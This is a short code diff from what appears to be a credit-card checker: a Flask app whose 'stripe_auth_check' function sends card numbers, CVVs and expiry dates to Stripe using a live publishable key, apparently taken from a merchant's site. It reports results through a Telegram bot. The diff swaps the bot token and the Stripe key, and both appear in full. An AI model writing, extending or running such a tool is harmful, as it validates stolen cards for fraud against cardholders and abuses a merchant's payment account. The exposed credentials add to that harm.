@@ -4,7 +4,7 @@ import re
 import threading
 
 # --- Configuration ---
-BOT_TOKEN = '8294313536:AAEbstNMHutpUDxUwaxvwJleW4wAxiLAoio'
+BOT_TOKEN = '8964801226:AAGb4hVVFutU1Z751HiqvztabIUUUkxWm8M'
 TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
 
 app = Flask(__name__)
@@ -29,7 +29,7 @@ def stripe_auth_check(cc, mm, yy, cvv):
         if not payment_nonce_match: return {"status": "Declined", "response": "Failed to get payment nonce.", "decline_type": "process_error"}
         ajax_nonce = payment_nonce_match.group(1)
         stripe_data = (f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}'
-                       '&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy')
+                       '&key=pk_live_51TWskSF79lbCDrn2YUT5OTMiCtJOtfjPRdu5Fvi77BXKcyrqYdDV43q7k7XTJlO8docnOY45e6KdcPZdYzPoyFRr00Xlnsy2Wn')
         stripe_response = session.post('https://api.stripe.com/v1/payment_methods', data=stripe_data)
         if stripe_response.status_code == 402:
             return {"status": "Declined", "response": stripe_response.json().get('error', {}).get('message', 'Declined by Stripe.'), "decline_type": "card_decline"}
